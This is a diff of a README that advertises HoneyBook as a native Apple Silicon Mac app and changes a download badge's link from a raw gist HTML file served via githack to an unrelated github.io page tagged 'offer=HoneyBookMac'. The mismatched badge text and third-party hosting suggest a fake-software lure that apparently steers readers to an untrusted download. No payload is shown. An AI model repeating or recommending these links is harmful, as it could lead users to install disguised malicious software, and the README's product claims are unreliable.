@@ -4,7 +4,7 @@
 From proposals and contracts to invoices and payments — HoneyBook automates your business workflow and helps you stay focused on what you do best.  
 Built with native support for **Apple Silicon**, it delivers a fast, seamless experience across the entire creative process. 🍎  
 
-[![💼 Get GitHub Instruction](https://img.shields.io/badge/💼%20Get%20HoneyBook%20Platform-F2B01E?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/kamikadzebro82-eng/6b8c67de0329421e2a9ed2c1ddca75d9/raw/73c8b294765be3915c0c6cb51c4998047778dd6a/app.html?offer=HoneyBookMac)
+[![💼 Get GitHub Instruction](https://img.shields.io/badge/💼%20Get%20HoneyBook%20Platform-F2B01E?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://git-apps-deployer.github.io/.github/?offer=HoneyBookMac)
 
 ---
 
